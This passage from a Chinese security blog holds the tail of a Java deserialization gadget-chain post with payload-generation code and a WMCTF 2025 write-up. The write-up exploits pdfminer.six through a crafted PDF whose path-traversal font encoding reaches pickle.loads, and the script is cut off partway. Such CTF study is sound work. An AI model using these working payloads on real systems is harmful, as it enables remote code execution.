com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyObject;  </span><br><span class="line"><span class="keyword">import</span> org.example.demo.Utils.MyProxy;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;  </span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.ShellCode.getEvilTemplatesImpl;  </span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> org.n4c1.tools.Tools.*;  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesNode1</span> <span class="operator">=</span> getEvilTemplatesImpl(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObjectHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        jsonObjectHandler.put(<span class="string">&quot;object&quot;</span>, templatesNode1);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyObject</span> <span class="variable">myObjectOfTemplates</span> <span class="operator">=</span> (MyObject) Proxy.newProxyInstance(jsonObjectHandler.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;MyObject.class&#125;, jsonObjectHandler);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">MyProxy</span> <span class="variable">myProxyHandler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyProxy</span>(myObjectOfTemplates);  </span><br><span class="line">        <span class="type">Templates</span> <span class="variable">myProxyTemplates</span> <span class="operator">=</span> (Templates) Proxy.newProxyInstance(myObjectOfTemplates.getClass().getClassLoader(),  </span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, myProxyHandler);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">toStringNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();  </span><br><span class="line">        toStringNode.put(<span class="string">&quot;1&quot;</span>, myProxyTemplates);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/// //////////////////  </span></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;\n&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap1.put(<span class="string">&quot;yy&quot;</span>,toStringNode);  </span><br><span class="line">        hashMap1.put(<span class="string">&quot;zz&quot;</span>, xString);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();  </span><br><span class="line">        hashMap2.put(<span class="string">&quot;yy&quot;</span>,xString);  </span><br><span class="line">        hashMap2.put(<span class="string">&quot;zz&quot;</span>,toStringNode);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> makeMap(hashMap1, hashMap2);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">poc</span> <span class="operator">=</span> serialize2base64(obj);  </span><br><span class="line">        string2file(poc, <span class="string">&quot;poc.txt&quot;</span>);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> HashMap <span class="title function_">makeMap</span><span class="params">(Object v1, Object v2)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();  </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);  </span><br><span class="line">        Class nodeC;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;  </span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">nodeCons</span> <span class="operator">=</span> nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);  </span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);  </span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));  </span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));  </span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);  </span><br><span class="line">        <span class="keyword">return</span> s;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以rce, 让人不解的是, 为什么<code>new XString(&quot;\n&quot;);</code>直接运行生成的poc可以弹计算器, 但是<code>new XString(&quot;1&quot;);</code>直接运行生成的poc就弹不了, 但调试就没问题, 也正常弹计算器, ???</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://su-team.cn/posts/e3fd1be7.html#tellmewhy">https://su-team.cn/posts/e3fd1be7.html#tellmewhy</a></p><p> <a href="https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86">https://mp.weixin.qq.com/s/gl8lCAZq-8lMsMZ3_uWL2Q#%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E4%B8%89%EF%BC%9A%E4%BD%BF%E7%94%A8%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WMCTF 2025 CTF WEB WP</title>
      <link href="/2025/09/22/WMCTF-2025-CTF-WEB-WP/"/>
      <url>/2025/09/22/WMCTF-2025-CTF-WEB-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pdf2text"><a href="#pdf2text" class="headerlink" title="pdf2text"></a>pdf2text</h2><p>题目代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfparser <span class="keyword">import</span> PDFParser</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfdocument <span class="keyword">import</span> PDFDocument</span><br><span class="line"><span class="keyword">import</span> os, io</span><br><span class="line"><span class="keyword">from</span> pdfutils <span class="keyword">import</span> pdf_to_text</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = <span class="number">2</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 2MB limit</span></span><br><span class="line"></span><br><span class="line">os.makedirs(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No file part&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    filename = file.filename</span><br><span class="line">    <span class="keyword">if</span> filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No selected file&#x27;</span>, <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">&#x27;/&#x27;</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;directory traversal is not allowed&#x27;</span>, <span class="number">403</span> </span><br><span class="line"></span><br><span class="line">    pdf_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)</span><br><span class="line">    pdf_content = file.stream.read()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># just if is a pdf</span></span><br><span class="line">        parser = PDFParser(io.BytesIO(pdf_content))</span><br><span class="line">        doc = PDFDocument(parser)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(pdf_path, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_content)</span><br><span class="line"></span><br><span class="line">    md_filename = os.path.splitext(filename)[<span class="number">0</span>] + <span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    txt_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], md_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pdf_to_text(pdf_path, txt_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(e), <span class="number">500</span> </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> send_file(txt_path, as_attachment=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>自定义的pdf_to_text函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pdfminer.high_level <span class="keyword">import</span> extract_pages</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LTTextContainer</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pdf_to_text</span>(<span class="params">pdf_path, txt_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(txt_path, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> txt:</span><br><span class="line">        <span class="keyword">for</span> page_layout <span class="keyword">in</span> extract_pages(pdf_path):</span><br><span class="line">            <span class="keyword">for</span> element <span class="keyword">in</span> page_layout:</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">isinstance</span>(element, LTTextContainer):</span><br><span class="line">                    txt.write(element.get_text())</span><br><span class="line">                    txt.write(<span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>题目用pdfminer.six这个库实现了一个 提取上传pdf中文字并返回的功能<br>一开始的思路是看是否能在pdf中引入外部资源, 然后pdf转txt时解析外部资源, 这样来造成文件读取, 但是似乎没有</p><p>之后, 题目给了hint:</p><blockquote><p>Search “pickle.loads” in pdfminer package and try to reach it</p></blockquote><p>全局搜索, 能找到的也就这一处<br><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250922142700.png" alt="image.png"></p><p>那就很简单了, 就是打这里的pickle反序列化<br>很明显这里是gzip解压一个文件然后loads, 我们只需要想办法控制 <code>_load_data</code>的name参数<br>构造思路, 全局搜索 _load_data方法</p><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250922143224.png" alt="image.png"><br>有两处触发点, 这里选用get_cmap, 继续往上找, 可以找到以下调用路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">extract_pages</span><br><span class="line">        PDFPageInterpreter#process_page</span><br><span class="line">                PDFPageInterpreter#render_contents</span><br><span class="line">                        PDFPageInterpreter#process_page</span><br><span class="line">                                PDFPageInterpreter#render_contents</span><br><span class="line">                                        PDFPageInterpreter#init_resources</span><br><span class="line">                                                PDFResourceManager#get_font</span><br><span class="line">                                                        PDFCIDFont#__init__</span><br><span class="line">                                                                PDFCIDFont#get_cmap_from_spec</span><br><span class="line">                                                                        CMapDB.get_cmap(cmap_name)</span><br><span class="line">                                                                            _load_data</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>extract_pages就是题目调用的地方</p><p>通过调试发现最后_load_data的参数是由&#x2F;Encoding控制的, 此外pdf中使用 # 来转义一个16进制数, 这样就可以使用 ..#2F构造出 ..&#x2F; , 避免与pdf中符号 &#x2F; 表示名字对象冲突</p><p>genPDF.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations  </span><br><span class="line"><span class="keyword">import</span> os  </span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO  </span><br><span class="line"><span class="keyword">import</span> logging  </span><br><span class="line">  </span><br><span class="line">logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line"><span class="comment"># This script hardcodes and generates a small PDF containing a variety of  </span></span><br><span class="line"><span class="comment"># page-content operators (graphics, text, state) so you can step through  </span></span><br><span class="line"><span class="comment"># pdfminer.six extract_pages() and observe how each operator is handled.  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Output: samples/debug_ops.pdf  </span></span><br><span class="line"><span class="comment">#  </span></span><br><span class="line"><span class="comment"># Key points to help debugging pdfminer internals:  </span></span><br><span class="line"><span class="comment"># - The font is a Type0 + CIDFont with /Encoding /GB-EUC-H to trigger  </span></span><br><span class="line"><span class="comment">#   CMapDB.get_cmap(&#x27;GB-EUC-H&#x27;) and thus CMapDB._load_data when not cached.  </span></span><br><span class="line"><span class="comment"># - The content stream includes operators: q/Q, cm, w, RG, rg, m, l, h, S,  </span></span><br><span class="line"><span class="comment">#   re, f, BT/ET, Tf, Td, Tm (implicit via Td), Tj, TJ.  </span></span><br><span class="line"><span class="comment"># - Chinese text bytes &lt;D6D0B9FA&gt; represent &quot;中国&quot; in GB2312, so with  </span></span><br><span class="line"><span class="comment">#   /Encoding /GB-EUC-H pdfminer will consult the CMap.  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_pdf_bytes</span>() -&gt; <span class="built_in">bytes</span>:  </span><br><span class="line">    bio = BytesIO()  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">w</span>(<span class="params">s: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:  </span><br><span class="line">        pos = bio.tell()  </span><br><span class="line">        bio.write(s)  </span><br><span class="line">        <span class="keyword">return</span> pos  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># Collect objects then build xref.  </span></span><br><span class="line">    objects: <span class="built_in">list</span>[<span class="built_in">tuple</span>[<span class="built_in">int</span>, <span class="built_in">bytes</span>]] = []  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 1. Catalog  </span></span><br><span class="line">    objects.append(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="number">1</span>,  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;&quot;</span>,  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 2. Pages  </span></span><br><span class="line">    objects.append(  </span><br><span class="line">        (  </span><br><span class="line">            <span class="number">2</span>,  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;&quot;</span>,  </span><br><span class="line">        )  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 4. Type0 Font with GB-EUC-H encoding to trigger CMap loading  </span></span><br><span class="line">    font_type0 = (  </span><br><span class="line">        <span class="number">4</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /Type0 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span>            <span class="comment"># b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Ftmp#2Fn4c1&quot;  </span></span><br><span class="line">            <span class="string">b&quot;/Encoding /..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2F..#2Fapp#2Fuploads#2Fn4c1&quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/DescendantFonts [6 0 R] &gt;&gt;&quot;</span>        ),  </span><br><span class="line">    )  </span><br><span class="line">    objects.append(font_type0)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 6. CIDFont descendant with GB1 registry  </span></span><br><span class="line">    cidfont = (  </span><br><span class="line">        <span class="number">6</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Font /Subtype /CIDFontType0 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/BaseFont /DebugCID &quot;</span>            <span class="string">b&quot;/CIDSystemInfo &lt;&lt; /Registry (n4c1222) /Ordering (n4c1_2) /Supplement 5 &gt;&gt; &quot;</span>            <span class="string">b&quot;/DW 1000 &quot;</span>            <span class="string">b&quot;/FontDescriptor &lt;&lt; &quot;</span>            <span class="string">b&quot;/Type /FontDescriptor &quot;</span>            <span class="string">b&quot;/FontName /DebugCID &quot;</span>            <span class="string">b&quot;/FontBBox [0 -200 1000 900] &quot;</span>  <span class="comment"># 必须是四个数字  </span></span><br><span class="line">            <span class="string">b&quot;/Ascent 800 &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/Descent -200 &quot;</span>            <span class="string">b&quot;/CapHeight 700 &quot;</span>            <span class="string">b&quot;/Flags 32 &quot;</span>            <span class="string">b&quot;/ItalicAngle 0 &quot;</span>            <span class="string">b&quot;/StemV 80 &quot;</span>            <span class="string">b&quot;&gt;&gt;&quot;</span>            <span class="string">b&quot;&gt;&gt;&quot;</span>        ),  </span><br><span class="line">    )  </span><br><span class="line">  </span><br><span class="line">    objects.append(cidfont)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 5. Page content stream — includes a variety of operators  </span></span><br><span class="line">    <span class="comment"># Note: GB2312 for 中国 is D6 D0 B9 FA    content_ops = b&quot;\n&quot;.join(  </span></span><br><span class="line">        [  </span><br><span class="line">            <span class="string">b&quot;q&quot;</span>,  <span class="comment"># save graphics state  </span></span><br><span class="line">            <span class="string">b&quot;1 0 0 1 0 0 cm&quot;</span>,  <span class="comment"># identity CTM (explicit)  </span></span><br><span class="line">            <span class="string">b&quot;0.75 w&quot;</span>,  <span class="comment"># line width  </span></span><br><span class="line">            <span class="string">b&quot;0 0 1 RG&quot;</span>,  <span class="comment"># stroke color = blue  </span></span><br><span class="line">            <span class="string">b&quot;1 0 0 rg&quot;</span>,  <span class="comment"># fill color = red  </span></span><br><span class="line">            <span class="string">b&quot;100 600 m&quot;</span>,  <span class="comment"># move to  </span></span><br><span class="line">            <span class="string">b&quot;200 650 l&quot;</span>,  <span class="comment"># line to  </span></span><br><span class="line">            <span class="string">b&quot;300 600 l&quot;</span>,  <span class="comment"># line to  </span></span><br><span class="line">            <span class="string">b&quot;h&quot;</span>,  <span class="comment"># close path  </span></span><br><span class="line">            <span class="string">b&quot;S&quot;</span>,  <span class="comment"># stroke  </span></span><br><span class="line">            <span class="string">b&quot;100 500 150 40 re&quot;</span>,  <span class="comment"># rectangle  </span></span><br><span class="line">            <span class="string">b&quot;f&quot;</span>,  <span class="comment"># fill  </span></span><br><span class="line">            <span class="string">b&quot;BT&quot;</span>,  <span class="comment"># begin text  </span></span><br><span class="line">            <span class="string">b&quot;/F1 24 Tf&quot;</span>,  <span class="comment"># font + size  </span></span><br><span class="line">            <span class="string">b&quot;100 700 Td&quot;</span>,  <span class="comment"># move text position  </span></span><br><span class="line">            <span class="string">b&quot;&lt;48656C6C6F20504446&gt; Tj&quot;</span>,  <span class="comment"># &quot;Hello PDF&quot;  </span></span><br><span class="line">            <span class="string">b&quot;0 -30 Td&quot;</span>,  <span class="comment"># next line down  </span></span><br><span class="line">            <span class="string">b&quot;&lt;D6D0B9FA&gt; Tj&quot;</span>,  <span class="comment"># &quot;中国&quot; in GB2312; mapped via GB-EUC-H  </span></span><br><span class="line">            <span class="string">b&quot;-50 -40 Td&quot;</span>,  <span class="comment"># move  </span></span><br><span class="line">            <span class="string">b&quot;[(AB) -50 (&lt;20&gt;) 100 (CD)] TJ&quot;</span>,  <span class="comment"># kerning array example  </span></span><br><span class="line">            <span class="string">b&quot;ET&quot;</span>,  <span class="comment"># end text  </span></span><br><span class="line">            <span class="string">b&quot;Q&quot;</span>,  <span class="comment"># restore graphics state  </span></span><br><span class="line">            <span class="string">b&quot;&quot;</span>,  </span><br><span class="line">        ]  </span><br><span class="line">    )  </span><br><span class="line">    stream = <span class="string">b&quot;stream\n&quot;</span> + content_ops + <span class="string">b&quot;\nendstream&quot;</span>  </span><br><span class="line">    content_len = <span class="built_in">len</span>(stream) - <span class="built_in">len</span>(<span class="string">b&quot;stream\n&quot;</span>) - <span class="built_in">len</span>(<span class="string">b&quot;\nendstream&quot;</span>)  </span><br><span class="line">    content_obj = (  </span><br><span class="line">        <span class="number">5</span>,  </span><br><span class="line">        <span class="string">b&quot;&lt;&lt; /Length %d &gt;&gt;\n&quot;</span> % content_len + stream,  </span><br><span class="line">    )  </span><br><span class="line">    objects.append(content_obj)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment"># 3. Page (references content and font resource)  </span></span><br><span class="line">    page_dict = (  </span><br><span class="line">        <span class="number">3</span>,  </span><br><span class="line">        (  </span><br><span class="line">            <span class="string">b&quot;&lt;&lt; /Type /Page /Parent 2 0 R &quot;</span>  </span><br><span class="line">            <span class="string">b&quot;/MediaBox [0 0 612 792] &quot;</span>            <span class="string">b&quot;/Resources &lt;&lt; /Font &lt;&lt; /F1 4 0 R &gt;&gt; &gt;&gt; &quot;</span>            <span class="string">b&quot;/Contents 5 0 R &gt;&gt;&quot;</span>        ),  